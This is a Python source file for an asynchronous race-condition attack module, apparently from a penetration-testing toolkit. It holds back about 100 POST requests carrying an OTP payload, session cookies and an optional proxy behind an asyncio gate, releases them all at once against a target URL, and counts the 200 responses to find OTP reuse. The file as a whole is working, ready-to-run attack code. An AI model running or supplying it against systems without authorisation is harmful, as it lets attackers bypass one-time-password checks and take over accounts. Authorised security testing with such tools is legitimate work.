"""
Async race condition attack module using httpx with gate mechanism.
True concurrent requests without GIL limitation.
"""
import logging
import asyncio
from typing import Dict, Any, List
import httpx

logger = logging.getLogger(__name__)


class AsyncRaceConditionModule:
    """Implements true async race condition testing (Turbo Intruder style)."""
    
    def __init__(self, base_payload: Dict[str, Any], num_requests: int = 100):
        """
        Initialize async race condition module.
        
        Args:
            base_payload: Original request payload with valid/invalid OTP
            num_requests: Number of concurrent requests (default: 100)
        """
        self.base_payload = base_payload.copy()
        self.num_requests = num_requests
        logger.info(f"AsyncRaceConditionModule initialized with {num_requests} concurrent requests")
    
    async def execute_race(self, 
                          target_url: str, 
                          headers: Dict[str, str],
                          cookies: Dict[str, str] = None,
                          proxy: str = None) -> List[httpx.Response]:
        """
        Execute true async race condition attack with gate mechanism.
        
        Args:
            target_url: Target URL
            headers: Request headers
            cookies: Session cookies
            proxy: Optional proxy URL
            
        Returns:
            List of Response objects from all requests
        """
        logger.info(f"Launching async race attack with {self.num_requests} requests...")
        
        # Gate mechanism - all requests wait here until released
        gate = asyncio.Event()
        responses = []
        
        # Configure httpx client
        proxies = {"http://": proxy, "https://": proxy} if proxy else None
        
        async with httpx.AsyncClient(proxies=proxies, timeout=10.0) as client:
            async def single_request():
                """Single request that waits for gate."""
                await gate.wait()  # Wait for gate to open
                try:
                    response = await client.post(
                        target_url,
                        json=self.base_payload,
                        headers=headers,
                        cookies=cookies
                    )
                    return response
                except Exception as e:
                    logger.error(f"Race request failed: {e}")
                    return None
            
            # Create all tasks
            tasks = [asyncio.create_task(single_request()) for _ in range(self.num_requests)]
            
            # Small delay to ensure all tasks are waiting at gate
            await asyncio.sleep(0.1)
            
            # Release the gate - all requests fire simultaneously
            logger.debug("Releasing gate - all requests firing now!")
            gate.set()
            
            # Gather all responses
            responses = await asyncio.gather(*tasks)
        
        # Filter out None responses (failed requests)
        valid_responses = [r for r in responses if r is not None]
        
        # Analyze results
        success_count = sum(1 for r in valid_responses if r.status_code == 200)
        logger.info(f"Race results: {success_count}/{len(valid_responses)} returned status 200")
        
        if success_count > 1:
            logger.warning(f"[!] RACE CONDITION DETECTED: {success_count} concurrent successes!")
        
        return valid_responses
    
    def get_description(self) -> str:
        """Return module description."""
        return """
        Async Race Condition Module - True concurrent testing:
        - Uses asyncio + httpx for real parallelism (no GIL)
        - Gate mechanism ensures all requests fire simultaneously
        - 100 requests within <50ms window
        - Detects OTP reuse and race windows in validation logic
        - More effective than ThreadPoolExecutor approach
        """
